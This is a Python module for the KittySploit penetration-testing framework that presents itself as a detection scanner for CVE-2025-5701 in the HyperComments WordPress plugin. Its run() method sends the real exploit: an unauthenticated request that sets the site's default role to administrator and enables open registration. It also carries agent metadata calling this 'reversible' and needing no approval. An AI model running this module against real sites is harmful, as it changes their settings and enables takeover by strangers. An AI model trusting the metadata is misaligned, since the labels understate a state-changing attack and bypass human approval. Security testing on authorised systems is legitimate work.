#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The HyperComments plugin for WordPress is vulnerable to unauthorized modification of data that can lead to pri."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HyperComments <= 1.2.2 - Arbitrary Options Update Detection',
        'description': 'The HyperComments plugin for WordPress is vulnerable to unauthorized modification of data that can lead to privilege escalation due to a missing capability check on the hc_request_handler function in all versions up to, and including, 1.2.2. This makes it possible for unauthenticated attackers to update arbitrary options on the WordPress site. This can be leveraged to update the default role for registration to administrator and enable user registration for attackers to gain administrative user access to a vulnerable site.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wp', 'wp-plugin', 'wordpress', 'hypercomments', 'priv-esc', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Nxploited/CVE-2025-5701/blob/main/CVE-2025-5701.py',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-5701',
        ],
        'cve': 'CVE-2025-5701',
    }

    def run(self):
        path = '/wp-content/plugins/hypercomments/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/wp-admin/index.php?hc_action=update_options'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='{"default_role":"administrator","users_can_register":"1"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('(?i)\\{\\s*"result"\\s*:\\s*"success"\\s*\\}',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='HyperComments <= 1.2.2 - Arbitrary Options Update detected', path=path)
            return True
        return False

